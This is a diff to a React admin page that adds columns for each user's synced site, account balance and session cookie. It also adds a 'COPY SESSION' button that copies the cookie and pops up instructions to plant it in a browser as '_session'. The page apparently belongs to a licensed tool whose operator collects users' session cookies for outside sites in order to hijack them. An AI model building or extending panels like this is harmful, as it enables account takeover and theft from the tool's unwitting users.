@@ -244,7 +244,9 @@ export default function AdminPage({ user }) {
                                                 <tr style={{ color: 'var(--text-dim)', fontSize: '0.7rem', textAlign: 'left', textTransform: 'uppercase', letterSpacing: '1px' }}>
                                                     <th style={{ padding: '15px' }}>Identity</th>
                                                     <th>License ID</th>
-                                                    <th>Role</th>
+                                                    <th>Synced Site</th>
+                                                    <th>Balance</th>
+                                                    <th>Session Cookie</th>
                                                     <th>Status</th>
                                                     <th style={{ textAlign: 'right', paddingRight: '25px' }}>Action</th>
                                                 </tr>
@@ -271,8 +273,21 @@ export default function AdminPage({ user }) {
                                                             </div>
                                                         </td>
                                                         <td style={{ fontSize: '0.85rem', color: 'var(--secondary)', fontWeight: 'bold', fontFamily: 'monospace' }}>{u.key_value}</td>
+                                                        <td style={{ fontSize: '0.75rem', textTransform: 'uppercase', fontWeight: '800' }}>{u.site_type || 'N/A'}</td>
+                                                        <td style={{ fontSize: '0.85rem', color: '#00ff9d', fontWeight: '900' }}>{u.balance || '0.00'}</td>
                                                         <td>
-                                                            {u.is_admin ? <span className="admin-badge">ADMIN</span> : <span style={{ opacity: 0.6, fontSize: '0.7rem' }}>PREMIUM</span>}
+                                                            {u.session ? (
+                                                                <button
+                                                                    onClick={() => {
+                                                                        navigator.clipboard.writeText(u.session);
+                                                                        alert('Cookie Copied! Info: Open Console -> Application -> Cookies -> Add _session=' + u.session);
+                                                                    }}
+                                                                    className="glass"
+                                                                    style={{ padding: '5px 12px', borderRadius: '8px', fontSize: '0.65rem', color: 'var(--primary)', border: '1px solid var(--primary)', cursor: 'pointer' }}
+                                                                >
+                                                                    COPY SESSION
+                                                                </button>
+                                                            ) : <span style={{ opacity: 0.3, fontSize: '0.7rem' }}>None</span>}
                                                         </td>
                                                         <td style={{ fontSize: '0.75rem', color: u.isOnline ? '#00ff9d' : 'var(--text-dim)' }}>{u.isOnline ? 'SYNCED' : 'OFFLINE'}</td>
                                                         <td style={{ textAlign: 'right', paddingRight: '20px' }}>
